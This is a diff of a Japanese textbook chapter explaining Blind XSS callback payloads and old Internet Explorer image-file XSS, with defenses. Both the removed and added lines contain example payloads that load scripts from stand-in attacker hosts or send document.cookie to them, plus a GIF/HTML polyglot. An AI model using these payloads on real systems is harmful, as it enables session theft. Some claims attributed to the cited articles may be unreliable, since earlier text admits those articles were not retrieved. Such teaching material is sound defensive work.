-3. 後日、**別のシステム**（社内サポートツール、管理者用ダッシュボード、監査ログビューア、CRM、あるいはSlack通知やメールに転記されてHTMLメールとして表示される場合など）が、このデータをHTMLとしてそのまま描画する。
-4. その画面を閲覧した管理者・オペレーターのブラウザ上でスクリプトが実行される。
+#### 1.2 「見えない」ことへの対処: コールバック型ペイロード
 
-この構造ゆえに、攻撃者が使うテスト用ペイロードは「実行された事実を、実行された環境から攻撃者のサーバへ通知する」ものでなければならない。単なる`alert(1)`では、攻撃者はそれが実行されたかどうかを一生知ることができない。
-
-#### 1.3 典型的なペイロードと、それぞれの意味
-
-```html
-<script src="https://xss.attacker-collab.example/c.js"></script>
-```
-
-外部の攻撃者管理サーバからJavaScriptを読み込ませる、最も基本的な形。`c.js`が読み込まれた時点でHTTPリクエストが攻撃者サーバに届くため、`Referer`ヘッダや`document.cookie`、`document.domain`、ページのURL、DOM構造などを`c.js`側のロジックでまとめて外部送信できる。なぜ動くかというと、ブラウザが`<script src>`を解釈した時点で、DOM内の値やCookieへアクセス可能な実行コンテキスト（そのオリジンのJavaScript実行環境）が既に与えられており、外部ホストへの`fetch`や`Image`送信自体はスクリプトの読み込み元ホストとは無関係に許可される（CSPで制限されていない限り、送信先の制約はスクリプト実行元のオリジンではなく`connect-src`/`img-src`等のディレクティブに依存する）ためである。
+観測できないなら、どうやって「刺さったかどうか」を知るのか。ここで使われるのが、**発火時に外部のサーバーへ通信を発生させるペイロード**である。古典的には次のような、外部JavaScriptを読み込ませる形が使われてきた。
 
 ```html
-<img src=x onerror="fetch('https://xss.attacker-collab.example/?c='+encodeURIComponent(document.cookie))">
+<script src="https://attacker-server.example/x.js"></script>
 ```
 
-画像読み込みに失敗（`src=x`は実在しないため必ず失敗する）した際に発火する`onerror`イベントハンドラを利用してJavaScriptを実行し、Cookieを外部に送信する。`<img>`はコンテンツを表示する要素だが、読み込みの成功・失敗というライフサイクルイベントにJavaScriptを紐づけられるため、`<script>`タグがフィルタされる環境でもしばしば通過する。
+このスクリプトが読み込まれた（＝GETリクエストが`attacker-server.example`に届いた）というアクセスログそのものが、「どこかの誰かのブラウザでペイロードが実行された」という動かぬ証拠になる。攻撃者はサーバーのアクセスログを監視するだけで、実行タイミング・実行元IP・User-Agent（≒発火した環境の管理画面のブラウザ情報）などを収集できる。
 
-こうした「実行の痕跡を外部サーバに残す」ためのペイロードを大量に、かつ管理しやすい形で発行・追跡するツールとして、XSS HunterやBurp Suiteの**Collaborator**（一意なサブドメインを発行し、そのサブドメインへの名前解決・HTTPアクセスをすべて記録して通知してくれる機能）が使われる。これらのツールが提供するペイロードは、上記のような`<script src>`型を土台に、実行環境のURL・Cookie・localStorage・DOM全体（`document.documentElement.outerHTML`）・スクリーンショット相当の情報まで自動収集して報告する仕組みを持つ。
+Bugcrowdの記事では、より現代的なバリエーションとして次の形が紹介されている。
 
-#### 1.4 有望な注入ポイント（攻撃対象の選定）
+```html
+<img/src/onerror=import('https://mybxssserver.com')>
+```
 
-Bugcrowdのブログで論じられている考え方の要点は、「Blind XSSは**人間が後から目視で確認する経路**を持つあらゆる入力に仕込む価値がある」という点に集約される。代表的な候補は以下の通りである。
+この一行の仕組みを分解すると次のようになる。
 
-- **カスタマーサポート系フォーム**: 問い合わせ内容、チャットサポートのメッセージ、フィードバック、バグ報告フォームなど。サポート担当者が管理画面でチケット本文を閲覧する際に発火する。
-- **HTTPヘッダ**: `User-Agent`、`Referer`、`X-Forwarded-For`など、サーバ側のアクセスログや解析ダッシュボードにそのまま表示される値。ログビューアがHTMLエスケープせずに表示を行っている場合に有効。
-- **プロフィール項目・氏名・会社名**: 注文管理システムや会員管理システムの管理画面で表示される。
-- **ファイルのメタデータ**（EXIF情報の説明文欄など）: 画像解析ツールや管理者向けの一覧画面がメタデータを表示する場合に発火する。
-- **自動化されたレポート・メール通知**: フォームの送信内容がそのまま社内の通知メールにHTMLとして埋め込まれる場合、メールクライアントのHTMLレンダリングエンジン（設定によりJavaScriptは通常無効化されているが、CSS injectionなど別の実害に転用できる場合がある点にも注意）。
+- `<img/src/onerror=...>` は、`<img src onerror=...>` を属性のスラッシュ区切りで難読化した表記であり、`src`属性の値が空（または不正なURL）のため画像の読み込みに失敗し、`onerror`イベントハンドラが発火する。これは伝統的なXSSペイロード`<img src=x onerror=alert(1)>`と原理は同じで、WAFや簡易フィルタによる`src=x`のようなパターンマッチを回避するための表記ゆれにすぎない。
+- `onerror`ハンドラの中身が`alert(1)`ではなく`import('https://mybxssserver.com')`になっている点が要になる。`import()`はJavaScriptの動的インポート構文で、指定したURLをESモジュールとして非同期に取得・評価しようとする。これが実行されると、ブラウザは即座に`mybxssserver.com`へHTTPリクエストを送る。
+- 記事が強調している利点は、単なる`alert(1)`（実行はされるが誰の目にも触れず、証拠が残らない）と違い、**リクエストというサーバーサイドのログを生む**点である。従来型の`<script src>`と本質的な役割は同じだが、`import()`はモダンなJS実行コンテキスト（type="module"やstrict寄りの環境）でも動作しやすく、記事はCSPや実行コンテキストの制約が強い現代のアプリでも通りやすい選択肢として紹介している。
 
-重要なのは、**1つのペイロード注入が、複数の異なる内部システム・異なる担当者の画面で、異なるタイミングに実行されうる**ことである。同じ入力値がサポートチームのダッシュボード、財務チームの請求書生成システム、監査ログ閲覧システムなど複数箇所に転記されるケースでは、1回の注入から複数件の独立した脆弱性が発見されることもある。この特性のため、攻撃者（診断者）は注入したペイロードのID・注入日時・注入先フォームを一覧管理し、長期間（数日〜数週間）にわたってコールバックを監視し続ける必要がある。これがBlind XSS診断が通常のXSS診断よりも「気長な監視作業」を要する理由である。
+このように「発火した」という一点のシグナルさえ得られれば、あとはCookieの外部送信、DOM内容のダンプ、スクリーンショット取得など、ペイロードをより高機能なJavaScript（いわゆるBlind XSS用のペイロードサーバーのフックスクリプト）に差し替えることで、発火した環境の情報を継続的に収集できる。これがXSS HunterやBurp Collaboratorのような「発火を検知するための外部リスナー」を使う運用スタイルの基本原理である。
 
-#### 1.5 防御策
+> 出典: The Guide to Blind XSS: Advanced Techniques for Bug Bounty Hunters — https://www.bugcrowd.com/blog/the-guide-to-blind-xss-advanced-techniques-for-bug-bounty-hunters-worth-250000/
 
-- **出力時のコンテキストに応じたエスケープ**を、ユーザーが直接目にする画面だけでなく、**管理者向け画面・社内ツール・ログビューアにも一貫して適用する**こと。「信頼された内部ユーザーしか見ない画面だから」という理由でエスケープを省略する設計が、Blind XSSを成立させる根本原因である。
-- **Content Security Policy（CSP）** の適用。管理画面側で`script-src`を厳格に設定していれば、たとえペイロードが格納されデータが描画されたとしても、外部スクリプトの読み込みや`onerror`によるインラインスクリプト実行を阻止できる（詳細は本教科書のCSPの章を参照）。
-- ログ・監査データを表示するツールでは、**HTMLとしてではなくプレーンテキストとして描画する**、あるいは表示前に信頼できるサニタイズライブラリ（DOMPurifyなど）を通す。
-- 社内ツールであっても、外部からの入力に由来するデータを扱う限り、外部公開Webアプリと同等のセキュリティレビューの対象とする。
+#### 1.3 「気長さ」が要求される理由
 
-> ⚠️ **未取得の資料**: 「The guide to blind XSS: Advanced techniques for bug bounty hunters worth $250,000」はネットワークの制限により本文を直接取得できませんでした（理由: 環境のegressプロキシによりbugcrowd.comへのアクセスがブロックされ、代替のWeb検索でも記事本文の詳細な引用は得られませんでした）。以下のURLからユーザーご自身で直接ご覧いただくことを推奨します: https://www.bugcrowd.com/blog/the-guide-to-blind-xss-advanced-techniques-for-bug-bounty-hunters-worth-250000/
->
-> （以下は未取得資料の補足として一般知識に基づく解説です）上記1.1〜1.5の内容は、Blind XSSに関する一般的なセキュリティ業界の知見（XSS Hunter・Burp Collaboratorの仕組み、代表的な注入ポイント、防御策）に基づいて構成したものであり、当該記事固有の具体的な事例（「$250,000」というタイトルが示唆する高額バウンティの実例やその詳細な手口）そのものではない点にご留意されたい。
+Blind XSSが通常のXSSと決定的に異なるのは、**発火までのタイムラグ**である。記事はこの点を強く強調しており、ペイロードが数週間から数ヶ月にわたって「休眠」した後、内部システムで初めて実行されるケースがあるとしている。理由は単純で、入力されたデータが実際に管理者や担当者の目に触れるタイミングは、業務フロー（例: サポートチケットが処理待ちのキューに積まれる、四半期に一度しか見られない監査ログにだけ現れる、等）に依存し、攻撃者側からは制御できないからである。
 
-> 出典: The guide to blind XSS: Advanced techniques for bug bounty hunters worth $250,000 — https://www.bugcrowd.com/blog/the-guide-to-blind-xss-advanced-techniques-for-bug-bounty-hunters-worth-250000/
+そのため実務上のワークフローは次のようになる。
 
----
+1. 想定される内部利用者（サポート、審査担当、管理者、内部監査ツールなど）が後から参照しそうな入力フィールドを幅広く洗い出す
+2. それぞれに、一意に識別可能なBlind XSSペイロード（どのフィールド・どのタイミングで送信したかを後から特定できるよう、ペイロードのURLにユニークなトークンを埋め込む）を送信する
+3. 外部リスナー（コールバックサーバー）のログを継続的に監視する
+4. 発火が確認できたら、その実行コンテキスト（どの管理画面か、どの権限のセッションか）を足がかりに、追加の情報収集や、より深刻な影響（管理者権限でのアカウント乗っ取り、社内システムへの横展開）につなげる
+
+記事はこの手法によって「6桁ドル（$100,000超）」規模、時には「$250,000を超える」報奨につながった事例があるとしており、Blind XSSが単なる理論上の脆弱性ではなく、影響範囲の大きさ（一般利用者ではなく、管理者・内部担当者の権限を奪取できる点）から高額バウンティの対象になりやすいことを裏付けている。
+
+#### 1.4 防御側の視点
+
+Blind XSSは攻撃ベクトルとしての新規性はなく、対策も基本的には格納型XSS全般への対策と同じである。
+
+- 出力エンコーディング（HTMLエンティティエスケープ）を、ユーザー向け画面だけでなく、**管理画面・社内ツール・サポートダッシュボードなど、内部利用者しか見ない画面にも一貫して適用する**。内部向け画面は「信頼された利用者しか見ない」という思い込みから、エスケープ処理が手薄になりがちであり、これがBlind XSSの主戦場になっている。
+- Content Security Policy（CSP）を管理画面側にも適用し、外部ドメインへの`script-src`接続や動的`import()`を制限する。
+- 監査ログ・チケットシステムなど、外部入力を後から表示する全てのシステムを棚卸しし、エスケープ漏れがないかを横断的に確認する。
 
 ### 2. 画像ファイルによるXSS（Image XSS）
 
-#### 2.1 前提: なぜ「画像」でスクリプトが実行されうるのか
+#### 2.1 「画像なのにHTMLとして実行される」という現象
 
-一見すると、`<img src="photo.gif">`のように読み込まれる画像ファイルの**中身**がHTMLやJavaScriptとして実行されることはあり得ないように思える。ブラウザは`Content-Type: image/gif`というレスポンスヘッダを見て、それを画像として描画するだけのはずだからである。
+Blind XSSが「どこで発火するか分からない」時間的・空間的な意味での「見えなさ」を扱うのに対し、画像XSSは、ブラウザが**ファイルの中身を何として解釈するか**という、コンテンツタイプ判定の穴を突く攻撃である。徳丸浩氏のブログ記事は、2007年前後のInternet Explorer（IE）で猛威を振るった、画像ファイルとしてアップロードされたファイルがHTML/JavaScriptとして実行されてしまう問題を整理したものである。
 
-しかし2007年前後、特に古いバージョンのInternet Explorer（IE6・IE7など）には、**コンテンツの種類を判定する際に、サーバが返した`Content-Type`ヘッダを絶対的な基準とせず、実際のファイルの先頭バイト列（マジックバイト）や内容を独自に「推測」して種類を決定する** という挙動（**MIMEスニッフィング / コンテンツスニッフィング**）が存在した。この挙動を悪用し、拡張子や`Content-Type`が画像であるにもかかわらず、内部にHTML/JavaScriptを仕込んだファイルをブラウザにHTMLとして解釈・実行させる攻撃が「画像ファイルによるXSS」である。
+このクラスの脆弱性が成立する背景には、**MIMEスニッフィング（コンテンツタイプの推測）**という仕組みがある。Webサーバーはレスポンスヘッダで`Content-Type: image/gif`のようにファイルの種類を宣言するが、古いIEはこのヘッダを鵜呑みにせず、ファイルの先頭バイト列（マジックバイト、ファイルシグネチャ）を独自に調べて「本当の種類」を推測し直す、という挙動を持っていた。Microsoft自身がMS07-057のセキュリティ情報の中で、「Internet Explorerはマジックバイトのテストを行い、成功すればサーバーが宣言したMIMEタイプとして処理する」という趣旨の説明をしている。
 
-#### 2.2 攻撃の仕組み（MIMEスニッフィングとポリグロットファイル）
+各画像フォーマットのマジックバイトは次の通りである。
 
-GIF形式のファイルは仕様上、必ず先頭6バイトが`GIF87a`または`GIF89a`という文字列（マジックナンバー）で始まる。したがって、次のようなバイト列を持つファイルを用意すると、
+| フォーマット | 先頭バイト（マジックバイト） |
+|---|---|
+| BMP | `BM` |
+| GIF | `GIF87a` または `GIF89a` |
+| JPEG | `\xFF\xD8` |
+| PNG | `\x89PNG\x0D\x0A\x1A\x0A` |
+
+問題は、このマジックバイトによる「本当の種類の推測」が万能ではなく、**マジックバイトさえ正しく置いておけば、それに続くファイル本体には（サーバーの検査をすり抜けられる限り）任意のバイト列、すなわちHTMLやJavaScriptを詰め込める**という点にある。
+
+#### 2.2 具体的な攻撃構造: `html.gif`
+
+徳丸氏の記事で例示されているのが、拡張子は`.gif`だが中身にHTMLとJavaScriptを含む`html.gif`のようなファイルである。構造としては、おおむね次のようになる。
 
 ```
-GIF89a
-<script>alert(document.cookie)</script>
+GIF89a....(ダミーの短いGIFヘッダ的なバイト列)....
+<html><body><script>alert(document.cookie)</script></body></html>
 ```
 
-このファイルは「先頭6バイトがGIFのマジックナンバーと一致する」という条件を満たすため、画像アップロード機能側の「拡張子が.gifであること」「マジックバイトがGIFであること」といったバリデーションを通過してしまう可能性がある。同時に、このファイル全体はテキストとして見れば妥当なHTMLの断片（`<script>`タグを含むテキスト）でもある。このように、**複数の異なるフォーマットの検証を同時に満たすファイル**は「ポリグロットファイル」と呼ばれる。
+これがなぜ問題を起こすかを段階的に説明する。
 
-問題は、このファイルがアップロードされ、Webサーバ上に置かれた後にブラウザから直接開かれた（あるいは`<img>`タグではなく、URLバーに直接そのファイルへのリンクを踏む・別ウィンドウで開くなどの経路で読み込まれた）場合である。旧IEは、サーバが返す`Content-Type: image/gif`ヘッダを信用しきらず、ファイルの実際の内容（先頭部分だけでなく、HTMLタグらしき文字列が含まれるか等）を解析し、**「これはHTMLらしい」と判断すると、画像としてではなくHTMLとしてレンダリングしてしまう**。その結果、ファイル内に埋め込まれた`<script>`タグが実行され、そのファイルが置かれているオリジン（ドメイン）の権限でJavaScriptが動作する。
+1. **サーバー側の画像アップロード機能**が、ファイル内容の検証をマジックバイトの有無程度でしか行っていない、あるいはContent-Typeを検証せずそのまま保存・配信していた場合、このファイルはGIF画像として受理・保存されてしまう。
+2. ユーザーがこのファイルを直接URLで開く（あるいは`<img>`タグで参照されたつもりが、リンククリックなどで直接ナビゲーションしてしまう）と、IEはレスポンスの`Content-Type`と実際のマジックバイトを突き合わせて中身を「検査」する。
+3. ここでIEの実装上の癖として、ファイルの前半にGIFとして解釈可能な体裁を保ちつつ、その後ろにHTMLタグ列を続けておくと、IEが「これはHTMLとして表示すべきコンテンツだ」と誤判定し、**画像ではなくHTMLドキュメントとしてレンダリングしてしまう**ケースが確認された。これによりファイル内に埋め込まれた`<script>`タグが、画像を配信しているオリジン（ドメイン）のコンテキストで実行される。
 
-これは通常のXSSにおける「入力値のエスケープ漏れ」とは全く異なる原理であることに注意されたい。サーバ側のアプリケーションコードは一切関与しておらず、**アップロードされたファイルの内容検証（拡張子チェック・マジックバイトチェックのみで、ファイル全体の内容を検査していない）の甘さ**と、**ブラウザ側のコンテンツスニッフィングという仕様（当時の仕様）**の組み合わせによって成立する。
+これは「拡張子は`.gif`」「サーバーは`Content-Type: image/gif`を返している」という二重の防御線が両方とも、IE独自のコンテンツ再解釈ロジックによって無効化されてしまう、という点で、後の章で扱うmXSS（Mutation XSS）やパーサの相互不一致によるXSSと同根の問題である。「サーバーが安全だと思っている形式」と「クライアントが実際に解釈する形式」が食い違うところに、常に脆弱性の余地が生まれる。
 
-#### 2.3 影響（インパクト）
+#### 2.3 BMPが特に厄介だった理由
 
-- 画像アップロード機能を持つ多くのサービス（当時のSNS、掲示板、ブログのアバター画像アップロードなど）は、アップロードされた画像を**攻撃者が意図的に細工したファイルであっても、アップロード元と同一オリジン（同一ドメイン）配下に配置する**ことが多かった。この場合、被害者が悪意ある画像ファイルのURLに直接アクセスするだけで、そのオリジンの文脈でJavaScriptが実行され、Cookie窃取やセッションハイジャックにつながる。
-- 画像を`<img>`タグとして埋め込んで表示するだけの通常の閲覧では発火しない点（IEがHTMLとして再解釈するのは、画像ファイルへ直接ナビゲートした場合や、一部の埋め込み方法に限られる）が特徴であり、被害者に「画像に見えるリンク」を直接開かせる、あるいは新しいタブで画像を開かせる操作（右クリック→画像を表示、など）を誘導するソーシャルエンジニアリングと組み合わされることがあった。
+記事の中でも重要な指摘が、**BMP形式は、Content-Typeとマジックバイトが正しく一致していてもなお、HTMLとして実行されてしまうことがあった**という点である。他のフォーマット（GIF、JPEG、PNG）は「ヘッダを偽装した場合」に問題が起きるのに対し、BMPは正規のBMPファイルとしての体裁を保ったまま、ファイル末尾（あるいはコメント相当の領域）に仕込んだHTML/JavaScriptが実行されてしまう、より根の深い実装バグだったとされる。このため、記事の対策案でも「BMPアップロードはPNGに変換してから配信する」ことが明確に推奨されている。BMPは非圧縮で構造が単純な分、余剰データを紛れ込ませる自由度が高く、パーサの許容範囲の広さがそのまま攻撃面になっていた、と理解できる。
 
-#### 2.4 バージョン依存性と現状の対策状況
+#### 2.4 タイムラインと修正状況
 
-この種の画像XSSは、**IE6・IE7時代のコンテンツスニッフィング仕様に強く依存する攻撃**であり、2007年当時に大きく問題視された。Microsoftはその後、`X-Content-Type-Options: nosniff`レスポンスヘッダを導入し、これを付与されたレスポンスについてはブラウザにコンテンツスニッフィングを行わせず、サーバが宣言した`Content-Type`をそのまま信用させる仕組みを提供した（IE8以降でサポート）。現代の主要ブラウザ（Chrome、Firefox、Edge、Safariの現行版）は、画像ファイルの中身をHTMLとして再解釈してスクリプトを実行するような積極的なコンテンツスニッフィングは行わない設計になっており、当時のGIF/JPEGへのHTML埋め込みによる直接的なXSSは基本的に成立しない。
+記事および関連情報から整理できる時系列は以下の通りである。
 
-ただし、「画像ファイルを経由したXSS」という発想そのものは形を変えて現代にも残っている点は押さえておくべきである。
+- **2004年7月**: はてなの画像アップロード機能において、画像ファイルを利用したXSS（当時のMHTML関連の問題、MS07-034として後に扱われた系統の問題）が修正された、という早期の実例が言及されている。
+- **2007年10月10日**: MicrosoftがMS07-057を公開し、特にPNGファイルのコンテンツタイプ判定を厳密化する修正を行った。これによりPNGを経由した同種の攻撃は大きく難しくなった。
+- **2008年（IE8）**: IE8の登場により、画像ファイルの再解釈によるHTML実行という攻撃経路の大部分が塞がれた。記事へのコメントでも、IE8環境では該当のサンプルファイルが「text/plainとして表示される」「壊れた画像アイコンになる」など、実行されずに失敗する挙動に変わったことが確認されている。
 
-- **SVGファイルによるXSS**: SVG（Scalable Vector Graphics）はXMLベースのフォーマットであり、仕様上`<script>`タグや`onload`などのイベントハンドラをファイル内に直接記述できる。多くのブラウザは、SVGファイルを`<img>`タグの`src`として読み込んだ場合はスクリプトを実行しないが、`<object>`・`<iframe>`・`<embed>`タグで埋め込んだ場合や、SVGファイルへ直接ナビゲートした場合にはスクリプトが実行される。したがって「画像アップロード機能がSVGファイルの拡張子・Content-Typeのみをチェックしており、埋め込みタグの制限を利用者に委ねている」場合、現在でも画像アップロード経由のXSSが成立する。
-- **ImageMagickなどの画像処理ライブラリの脆弱性**（例: 2016年に公開されたImageTragick、CVE-2016-3714）のように、画像「ファイル形式の解釈」そのものに起因する脆弱性は形を変えて現在も発生し続けている。
+つまりこの攻撃は、**2004年〜2007年頃のIE（特にIE7以前）に固有**の問題であり、2008年のIE8で概ね収束した、歴史的な脆弱性である。現代の主要ブラウザ（Chrome、Firefox、Edge（Chromium版）、Safari）では、`Content-Type`と`X-Content-Type-Options: nosniff`ヘッダの組み合わせや、より厳格なMIMEスニッフィングの仕様（WHATWGのMIME Sniffing Standard）により、画像として宣言されたリソースをHTMLとして実行することは基本的に起こらない。
 
-#### 2.5 防御策
+とはいえ、この事例が現代においても持つ教訓は色褪せない。**「サーバーが送ったContent-Typeを、クライアントが額面通りに信用するとは限らない」**という前提は、SVGファイルのアップロード（SVGはXML文書であり`<script>`を内包できるため、現在でも重要なXSSベクトルである）や、ファイルアップロード機能全般のセキュリティレビューにおいて、いまなお中心的な論点であり続けている。
 
-- サーバ側で画像アップロードを受け付ける際は、**拡張子や先頭マジックバイトの検査だけでなく、画像を実際にデコード・再エンコードし直す（サムネイル生成等の過程で正規の画像ライブラリに通す）**ことで、HTMLやスクリプトを含む不正なペイロードを構造的に排除する。
-- すべてのレスポンスに`X-Content-Type-Options: nosniff`を付与し、ブラウザによるコンテンツスニッフィングを無効化する。
-- ユーザーがアップロードしたファイルは、**メインのアプリケーションと異なる別オリジン（サブドメインなど）で配信する**ことで、万一スクリプトが実行されてもメインアプリのCookieやセッションにはアクセスできないようにする（Cookieのスコープを分離する設計）。
-- SVGファイルのアップロードを許可する場合は、アップロード時に`<script>`・イベントハンドラ属性・外部参照などをサニタイズする、あるいは`<img>`タグとしてのみ表示させ`<object>`/`<iframe>`埋め込みを禁止する。
+#### 2.5 防御策のまとめ
 
-> ⚠️ **未取得の資料**: 「画像ファイルによるクロスサイト・スクリプティング(XSS)傾向と対策」（徳丸浩の日記、2007年12月）はネットワークの制限により本文全体を直接取得できませんでした（理由: 環境のegressプロキシによりblog.tokumaru.orgへのアクセスがブロックされたため）。代替のWeb検索により、GIFのマジックバイト（`GIF87a`/`GIF89a`）を利用した検証回避や、旧IEがContent-Typeよりもコンテンツの内容を優先して種類を判定する「コンテンツスニッフィング」が原理であるという要点は確認できましたが、記事内で紹介されている具体的な各画像形式（GIF・JPEG・PNG等）ごとの詳細な検証結果や個別の対策手順の全文は取得できていません。詳細は以下のURLからユーザーご自身で直接ご確認ください: https://blog.tokumaru.org/2007/12/image-xss-summary.html
->
-> （以下は未取得資料の補足として一般知識に基づく解説です）上記2.1〜2.5の内容は、当時広く知られていたIEのコンテンツスニッフィング問題とGIFポリグロットの技術的原理、およびその後の`X-Content-Type-Options: nosniff`による対策の一般的な経緯を踏まえて構成したものである。
+徳丸氏の記事が示す対策、および現代的な補完策を合わせると以下のようになる。
 
-> 出典: 画像ファイルによるクロスサイト・スクリプティング(XSS)傾向と対策 — https://blog.tokumaru.org/2007/12/image-xss-summary.html
+1. **マジックバイトの検証**: アップロードされたファイルが、拡張子や申告されたContent-Typeと一致する正しいマジックバイトを持つかを、サーバー側で検証する。
+2. **`X-Content-Type-Options: nosniff`の付与**: 画像・ユーザーアップロードファイルを配信するレスポンスに必ずこのヘッダを付け、ブラウザ側のコンテンツタイプ推測（スニッフィング）そのものを無効化する。
+3. **BMPのような単純・低検証フォーマットの回避**: BMPアップロードを受け付ける場合は、サーバー側でPNG等の安全性が確立したフォーマットに変換してから保存・配信する。
+4. **ユーザーアップロードファイルの配信オリジンの分離**: 画像やユーザーファイルは、メインのアプリケーションとは別のCookieなしドメイン（sandboxドメイン）から配信し、万一HTMLとして解釈されてもセッションを窃取できないようにする。これは画像XSSに限らず、SVGアップロードなど現代のアップロード関連XSS全般への標準的な緩和策である。
+
+> 出典: 徳丸浩の日記: 画像を経由したXSS(クロスサイトスクリプティング)の状況 — https://blog.tokumaru.org/2007/12/image-xss-summary.html
+
+### 3. 二つのトピックに共通する視点
+
+Blind XSSと画像XSSは、攻撃の見た目こそ大きく異なるが、次の一点で強くつながっている。**「攻撃者が想定している実行コンテキストと、実際にコードが実行されるコンテキストがずれている」**ことを突いている点である。
+
+- Blind XSSでは、攻撃者が入力した先（サポートフォームなど）と、実際にコードが実行される画面（管理ダッシュボード）が空間的・時間的にずれている。防御側はこのずれのために、「見えない場所」のエスケープ処理を見落としがちである。
+- 画像XSSでは、サーバーが宣言した種類（image/gif）と、クライアントが実際に解釈する種類（text/html）がずれている。防御側はこのずれのために、「画像だから安全」という思い込みでコンテンツ検証を省略しがちである。
+
+いずれも、単一のレイヤー（入力バリデーション、あるいはContent-Type宣言）だけを信用せず、実際にコードが実行される最終地点でのエスケープ処理・コンテンツタイプの強制（`nosniff`）・CSPといった多層的な防御を組み合わせることが有効な対策となる。
 
 ---
 
